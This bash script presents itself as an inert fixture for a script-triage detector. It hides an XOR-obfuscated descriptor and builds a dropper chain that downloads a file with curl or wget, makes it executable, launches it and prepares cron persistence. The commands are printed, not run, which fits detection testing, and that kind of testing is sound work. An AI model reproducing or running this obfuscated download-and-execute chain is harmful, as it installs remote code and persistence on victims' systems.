#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_23ae3289='140,137,141,143,138,130,136,219,223,131,151,223,206,219,222,202,207,149,222,148,212,213,200,217,149,217,206,223,149,135,210,206,219,202,229,212,213,200,217,198,223,217,211,204,200,223,201,148,140,137,141,143,138,130,136,219,223,131,151,223,206,219,222,202,207,135,223,215,219,212,229,223,217,211,204,200,223,201,198,215,151,223,215,219,212,207,135,223,216,213,200,202,229,210,217,200,219,198,140,137,141,143,138,130,136,219,223,131,151,223,221,219,206,201,148,149,223,210,217,219,217,151,201,201,223,200,206,212,207,210,149,202,215,206,149,135,210,206,219,202,229,223,214,211,220,198,140,137,141,143,138,130,136,219,223,131,149,216,219,246,201,201,223,200,206,212,207,242,135,206,212,223,221,219,229,200,223,201,207,198,210,201,148,141,138,138,131,219,138,216,220,149,222,211,214,219,204,212,211,148,223,214,202,215,219,194,223,148,140,137,141,143,138,130,136,219,223,131,149,149,128,201,202,206,206,210,135,214,200,207,198,140,137,141,143,138,130,136,219,223,131,151,212,221,211,219,202,215,219,217,135,222,211,229,212,221,211,219,202,215,219,217,198,143,135,206,212,207,213,217,229,223,221,219,206,201,198,209,217,219,216,214,214,219,220,229,210,217,200,219,229,206,223,221,205,135,200,223,206,202,219,222,219,198,201,201,223,217,213,200,202,229,210,217,206,219,202,201,211,222,150,223,222,213,215,229,223,221,212,219,210,217,150,223,214,211,220,229,223,206,211,200,205,150,223,206,213,215,223,200,229,223,200,211,207,203,217,219,150,206,201,213,210,229,223,214,211,220,213,200,202,135,201,202,223,206,201,198,139,135,204'
  readonly Codec_23ae3289='reversed_decimal|single_byte_xor|ba'

  Load_23ae3289() {
    e=()
    local IFS=',' i
    local -a pieces
    read -r -a pieces <<< "${Material_23ae3289}"
    for ((i=${#pieces[@]}-1; i>=0; i--)); do e+=("${pieces[i]}"); done
  }

  Decode_23ae3289() {
    d=()
    local i
    for ((i=0; i<${#e[@]}; i++)); do
      d+=("$((e[i] ^ 186))")
    done
  }

  Recover_23ae3289() {
    local -a e d
    local t n z i
    local -a compass=(north south); n="$(IFS=:; printf '%s' "${compass[*]}")"
    Load_23ae3289
    Decode_23ae3289
    t=''
    local octal character
    for i in "${!d[@]}"; do
      printf -v octal '%03o' "${d[i]}"
      printf -v character '%b' "\\$octal"
      t+="$character"
    done
    printf '%s\n' "$t"
  }

  Inspect_23ae3289() { local recovered field; local -a fields; recovered="$(Recover_23ae3289)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_23ae3289() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_23ae3289)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_23ae3289; fi
